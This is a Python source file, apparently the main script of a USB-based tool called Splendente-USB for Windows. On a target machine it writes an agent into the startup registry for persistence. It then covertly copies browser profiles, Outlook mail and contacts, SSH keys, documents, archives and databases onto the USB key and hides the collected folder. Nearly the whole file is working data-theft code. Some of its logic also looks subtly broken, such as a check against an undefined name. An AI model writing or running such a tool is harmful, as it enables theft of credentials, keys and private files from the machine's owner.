# -*- coding: utf-8 -*-

# https://github.com/Hnfull/Splendente-USB

"""

                                                                                                                                            
 @@@@@@   @@@@@@@   @@@       @@@@@@@@  @@@  @@@  @@@@@@@   @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@
@@@@@@@   @@@@@@@@  @@@       @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@  @@@@@@@@
!@@       @@!  @@@  @@!       @@!       @@!@!@@@  @@!  @@@  @@!       @@!@!@@@    @@!    @@!
!@!       !@!  @!@  !@!       !@!       !@!!@!@!  !@!  @!@  !@!       !@!!@!@!    !@!    !@!
!!@@!!    @!@@!@!   @!!       @!!!:!    @!@ !!@!  @!@  !@!  @!!!:!    @!@ !!@!    @!!    @!!!:!
 !!@!!!   !!@!!!    !!!       !!!!!:    !@!  !!!  !@!  !!!  !!!!!:    !@!  !!!    !!!    !!!!!:
     !:!  !!:       !!:       !!:       !!:  !!!  !!:  !!!  !!:       !!:  !!!    !!:    !!:
    !:!   :!:        :!:      :!:       :!:  !:!  :!:  !:!  :!:       :!:  !:!    :!:    :!:
:::: ::    ::        :: ::::   :: ::::   ::   ::   :::: ::   :: ::::   ::   ::     ::    ::: ::::
:: : :     :        : :: : :  : :: ::   ::    :   :: :  :   : :: ::   ::    :      :     : :: :::
                                                                                                                                            

                                                                                                                                            
                                @@@  @@@   @@@@@@   @@@@@@@   
                                @@@  @@@  @@@@@@@   @@@@@@@@  
                                @@!  @@@  !@@       @@!  @@@  
                                !@!  @!@  !@!       !@   @!@  
                                !@!  !!@@!!    @!@!@!@   
                                !@!  !!!   !!@!!!   !!!@!!!!  
                                !!:  !!!       !:!  !!:  !!!  
                                :!:  !:!      !:!   :!:  !:!  
                                ::::: ::  :::: ::    :: ::::  
                                : : :  :   :: : :    :: : ::   


"""

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import win32api
import win32con
import os
import logging
import re
import glob
import shutil
import sys

from core.splendente_dirs   import Directories
from core.splendente_conf   import Conf
from core.splendente_utils  import Date, SmallSize, MediumSize, HighSize, BigSize
from core.splendente_mount  import TargetMount, UsbMount
from core.splendente_copy   import Copy
from core.splendente_persistence import Persistence

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

PLATFORM = sys.platform

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    if PLATFORM == "win32":
        # -- Check if USB key (USB_DATA) is mounted -- #
        usbMount        = UsbMount()
        usbMountLetter  = usbMount.SearchUsbMountLetter()
    else:
        sys.exit(1)

    # -- Check if project is present in USB key -- #
    if usbMountLetter != None:
        if os.path.exists("{}\\Splendente-USB".format(usbMountLetter)) == True:
            splendenteProject = "Splendente-USB"

            # -- Check if log file is available on USB key -- #
            if os.path.exists("{}\\{}\\log\\splendente.log".format(usbMountLetter, splendenteProject)) == True:
                # -- Define log file -- #
                logFile = "{}\\{}\\log\\splendente.log".format(usbMountLetter, splendenteProject)
                logging.basicConfig(
                                    filename=logFile,
                                    level=logging.DEBUG,
                                    format="%(name)s : %(levelname)s : %(message)s"
                                    )
                # -- Delete old data in log file on USB key --#
                open(logFile, "w").close()
                if os.path.getsize(logFile) == 0:
                    logging.info("Old {} -> deleted".format(logFile))
            else:
                sys.exit(1)
        else:
            sys.exit(1)
    else:
        sys.exit(1)

    # -- Check if conf file is available on USB key -- #
    if os.path.exists("{}\\{}\\conf\\splendente.ini".format(usbMountLetter, splendenteProject)) == True:
        confUsbDirectory = "{}\\{}\\conf\\splendente.ini".format(usbMountLetter, splendenteProject)
        # --- Name of folder that will contain all data in USB key --- #
        dataUsbDirectory = "{}\\{}\\data_{}".format(usbMountLetter, splendenteProject, Date())
        os.makedirs(dataUsbDirectory)
        # -- Check if data folder is available on USB key -- #    
        
        if os.path.exists(dataUsbDirectory) == True:
            # --- Found directories on target --- #
            targetMount         = TargetMount()
            targetMountLetter   = targetMount.SearchPartitionsMount()
            conf                = Conf()
            directories         = Directories()

            directoriesFound = directories.Search(conf.Directories(confUsbDirectory), "Target", targetMountLetter, usbMountLetter)
            if directoriesFound != ERR:
                for i in directoriesFound:
                    if i != None:
                        logging.info("Found : {}".format(i))
            else:
                sys.exit(1)

            # --- Create folders in USB that will found on target --- #
            usbDirectories = directories.Search(conf.Directories(confUsbDirectory),"USB", targetMountLetter, usbMountLetter)
            if usbDirectories != 1:
                for i in usbDirectories:
                    if i != None:
                        if os.path.exists(i) == False:
                            try:
                                os.makedirs("{}\\{}".format(dataUsbDirectory, i))
                            except Exception as e:
                                logging.error(e)
                                pass
            else:
                sys.exit(1)

            # --- Check if agent directory is available on USB key --- #
            if os.path.exists("{}\\{}\\agent".format(usbMountLetter, splendenteProject)) == True:
                # --- Files copy from USB key --- #
                agentUsbDirectory = "{}\\{}\\agent".format(usbMountLetter, splendenteProject)
                try:
                    persistence = Persistence()
                    if (persistence.Registry(agentUsbDirectory) != 0):
                        logging.error("Persistence : Adding in startup registry -> Failed")
                    else:
                        logging.info("Persistence : Adding in startup registry -> Successful")
                except Exception as e:
                    logging.error(e)
                    pass         
            else:
                logging.info("No {}\\{}\\agent directory".format(usbMountLetter, splendenteProject))

            copy = Copy()

            # -- Files copy from target -- #
            for usbFolder in usbDirectories:
                for targetPath in directoriesFound:
                    # -- Folders of user profile and other partitions mounted -- #
                    if usbFolder in targetPath:
                        usbFolderFound = "{}\\{}".format(dataUsbDirectory, usbFolder)

                        if re.match(r"^Chrome$", usbFolder):
                            copy.MediumDepth(conf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                        elif re.match(r"^Firefox$", usbFolder):
                            copy.MediumDepth(conf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                        elif re.match(r"^MicrosoftEdge$", usbFolder):
                            copy.MediumDepth(conf.MicrosoftEdgeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                        elif re.match(r"(^Outlook$)|(^Contacts$)", usbFolder):
                            copy.MediumDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                        elif re.match(r"^Pictures$", usbFolder):
                            copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                        elif re.match(r"^SSH$", usbFolder):
                            copy.HighDepth(conf.SSH(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                        elif re.match(r"(^Documents$)|(^Downloads$)|(^Desktop$)|(^Dropbox$)|(^OneDrive$)", usbFolder):
                            copy.HighDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                            copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                            copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                            copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                            
                        elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
                            copy.MediumDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                            copy.HighDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                            copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                            copy.HighDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                            copy.HighDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                            copy.HighDepth(conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                        else:
                            continue

                        if glob.glob("{}\\*.*".format(usbFolderFound)) != []:
                            logging.info("Copy {} -> Successful".format(usbFolderFound))
                        else:
                            # -- Remove folder empty in USB key -- #
                            try:
                                shutil.rmtree(usbFolderFound)
                                if os.path.exists(usbFolderFound) == False:
                                    logging.info("Remove {} -> Failed (No data)".format(usbFolderFound))
                            except Exception as e:
                                logging.error(e)
                                pass

                    # -- User profile only -- #
                    elif re.match(r"^WindowsHome$", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                        usbFolderFound = "{}\\{}".format(dataUsbDirectory, usbFolder)
                        copy.SmallDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                        copy.SmallDepth(conf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                        copy.SmallDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                        copy.SmallDepth(conf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                        copy.SmallDepth(conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                        if glob.glob("{}\\*.*".format(usbFolderFound)) != []:
                            logging.info("Copy {} -> Successful".format(usbFolderFound))
                        else:
                            # -- Remove folder empty in USB key -- #
                            try:
                                shutil.rmtree(usbFolderFound)
                                if os.path.exists(usbFolderFound) == False:
                                    logging.info("Remove {} -> Failed (No data)".format(usbFolderFound))
                            except Exception as e:
                                logging.error(e)
                                pass
                    else:
                        continue

            # -- Set the folder in hidden mode containing the copy files -- #
            win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
            
        else:
            logging.error("No {}\\data directory".format(usbMountLetter))
    else:
        logging.error("No {}\\conf\\splendente.ini".format(usbMountLetter))
        sys.exit(1)


#---------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
